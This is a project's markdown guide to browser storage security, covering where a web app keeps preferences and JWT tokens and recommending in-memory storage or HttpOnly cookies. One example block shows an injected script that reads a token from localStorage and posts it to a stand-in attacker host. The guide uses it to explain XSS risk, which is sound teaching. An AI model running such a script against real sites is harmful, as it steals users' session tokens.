# Storage Security Guide

## 📊 Storage Comparison

| Storage Type | Size Limit | Security | Persistence | Use Case |
|-------------|------------|----------|-------------|----------|
| **localStorage** | 5-10MB | ⚠️ Vulnerable to XSS | Forever | User preferences |
| **sessionStorage** | 5-10MB | ⚠️ Vulnerable to XSS | Tab session | Temporary data |
| **Memory** | RAM limit | ✅ Safe from XSS | Page session | Tokens (current) |
| **HttpOnly Cookies** | 4KB | ✅ Safe from XSS | Configurable | **Best for tokens** |
| **IndexedDB** | 100s of MB | ⚠️ Vulnerable to XSS | Forever | Large datasets |

## 🔒 Current Implementation

### ✅ Stored in localStorage (Safe for preferences):
- **Theme** - dark/light mode, colors
- **Language** - ar/en, RTL settings
- **Sidebar** - open state, width
- **User Info** - name, email, role (non-sensitive)

### 🔐 Stored Securely (NOT in localStorage):
- **JWT Access Token** - in memory (via `secureStorage.js`)
- **Refresh Token** - in memory (via `secureStorage.js`)

## ⚠️ Security Concerns with localStorage

### XSS Attack Scenario:
```javascript
// If an attacker injects this script:
<script>
  const token = localStorage.getItem('user_token');
  // Send token to attacker's server
  fetch('https://evil.com/steal', { 
    method: 'POST', 
    body: token 
  });
</script>
```

### Why It's Dangerous:
- ❌ Any script on your page can read localStorage
- ❌ Third-party libraries could be compromised
- ❌ Browser extensions can access it
- ❌ Tokens persist forever (even after browser closes)

## ✅ Our Solution

### Option 1: Memory Storage (Current)
**Location:** `src/utils/secureStorage.js`

**Pros:**
- ✅ Immune to XSS attacks on storage
- ✅ Simple to implement
- ✅ No backend changes needed

**Cons:**
- ❌ User must re-login after page refresh
- ❌ Tokens lost when tab closes

**When to use:** 
- Development phase
- When security is priority over UX
- Internal admin dashboards

### Option 2: sessionStorage (Alternative)
Uncomment the alternative code in `secureStorage.js`

**Pros:**
- ✅ Tokens persist during tab session
- ✅ Better UX than memory storage

**Cons:**
- ⚠️ Still vulnerable to XSS
- ❌ Lost when tab closes

**When to use:**
- Need session persistence
- Acceptable XSS risk
- CSP (Content Security Policy) is enforced

### Option 3: HttpOnly Cookies (Recommended for Production)
**Requires backend implementation**

**Pros:**
- ✅ Most secure (immune to XSS)
- ✅ Tokens persist across sessions
- ✅ Browser manages automatically

**Cons:**
- ⚠️ Vulnerable to CSRF (mitigated with SameSite)
- ⚠️ Requires backend changes
- ⚠️ Doesn't work with cross-domain APIs

**Implementation:**
```javascript
// Backend sets cookie:
res.cookie('access_token', token, {
  httpOnly: true,      // Immune to XSS
  secure: true,        // HTTPS only
  sameSite: 'strict',  // CSRF protection
  maxAge: 3600000      // 1 hour
});

// Frontend: No need to handle tokens!
// Browser automatically sends cookie with requests
```

## 🛡️ Best Practices

### For Development:
```javascript
// Use memory storage (current implementation)
import { setSecureToken, getSecureToken } from '@/utils/secureStorage';

// After login
setSecureToken(accessToken, refreshToken);

// For API calls
const token = getSecureToken();
```

### For Production:
1. **Implement HttpOnly cookies** (backend required)
2. **Add CSP headers** to prevent XSS
3. **Use HTTPS** always
4. **Implement CSRF tokens**
5. **Add security headers**

## 🔄 Migration Path

### Phase 1 (Current): Memory Storage
- User data in localStorage (non-sensitive only)
- Tokens in memory
- User re-logins on refresh

### Phase 2 (Optional): sessionStorage
- Tokens persist during session
- Better UX for development

### Phase 3 (Production): HttpOnly Cookies
- Backend sets cookies
- Frontend reads from cookies
- Best security + UX

## 📝 Checklist

- [x] User preferences in localStorage
- [x] Sensitive data filtered from localStorage
- [x] Tokens stored securely (memory)
- [ ] Implement refresh token flow
- [ ] Add token expiration handling
- [ ] Setup HttpOnly cookies (backend)
- [ ] Add CSP headers
- [ ] Implement CSRF protection

## 🔗 Resources

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [JWT Storage Best Practices](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

